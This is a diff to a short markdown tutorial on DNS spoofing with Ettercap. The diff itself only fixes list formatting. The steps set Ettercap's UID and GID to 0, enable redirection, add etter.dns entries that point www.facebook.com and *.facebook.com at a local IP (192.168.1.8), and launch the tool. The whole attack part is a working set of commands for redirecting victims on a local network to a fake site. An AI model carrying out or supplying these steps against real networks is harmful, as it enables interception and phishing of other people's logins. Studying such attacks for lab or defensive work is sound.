@@ -12,13 +12,13 @@ websites instead of legitimate ones.
 
 ## How the Attack Works
 
-1.  * First edit the Ettercap configuration file.
+1.  First edit the Ettercap configuration file.
 
      ```bash
      gedit /etc/ettercap/etter.conf 
      ```
 
-2.  * the UID and GID values at the top to make them say 0.
+2.  Change the UID and GID values at the top to make them say 0.
 
      ```bash
      ec_uid = 0
@@ -26,20 +26,20 @@ websites instead of legitimate ones.
      ```
   
 
-3. * Now scroll down until you find the heading that says Linux and under that remove both the # 
+3. Now scroll down until you find the heading that says Linux and under that remove both the # 
 signs below where it is redir_command_on
 
-4. * Configure another ettercap file called etter.dns
+4. Configure another ettercap file called etter.dns
      ```bash
      leafpad /etc/ettercap/etter.dns
      ```
-5. * Add the domain names you would like to redirect to your local server
+5. Add the domain names you would like to redirect to your local server
      ```bash
      www.facebook.com A 192.168.1.8
      *.facebook.com A 192.168.1.8
      ```
 
-6. * Now open up ettercap and start the attack.
+6. Now open up ettercap and start the attack.
       ```bash
      ettercap -G
      ```
